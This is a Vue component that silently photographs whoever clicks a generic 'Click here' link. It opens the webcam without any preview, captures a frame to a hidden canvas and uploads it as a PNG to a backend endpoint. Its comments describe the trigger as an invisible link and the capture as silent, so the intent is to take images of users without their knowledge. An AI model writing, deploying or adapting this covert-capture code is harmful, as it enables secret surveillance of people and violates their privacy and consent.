<script setup>
import { ref, onMounted } from "vue";

const isLoading = ref(false);

const takePhotoSilently = async () => {
  isLoading.value = true;

  try {
    // Access camera (No preview)
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await new Promise((resolve) => (video.onloadedmetadata = resolve));
    video.play();

    // Capture photo immediately
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photoData = canvas.toDataURL("image/png"); // Convert to base64

    // Stop camera after capture
    stream.getTracks().forEach((track) => track.stop());

    // Send image to backend
    await uploadPhoto(photoData);
  } catch (error) {
    console.error("Camera access failed:", error);
  } finally {
    isLoading.value = false;
  }
};

// Upload image to backend
const uploadPhoto = async (photoData) => {
  const blob = await (await fetch(photoData)).blob();
  const formData = new FormData();
  formData.append("photo", blob, `photo-${Date.now()}.png`);

  try {
    await fetch("/api/upload", { method: "POST", body: formData });
    console.log("Photo uploaded successfully!");
  } catch (error) {
    console.error("Upload failed", error);
  }
};
</script>

<template>
  <div class="flex flex-col items-center p-4">
    <!-- Invisible link to trigger photo -->
    <a href="#" @click.prevent="takePhotoSilently" class="text-blue-500 underline">
      Click here
    </a>

    <p v-if="isLoading" class="text-gray-500 mt-2">Capturing photo...</p>
  </div>
</template>
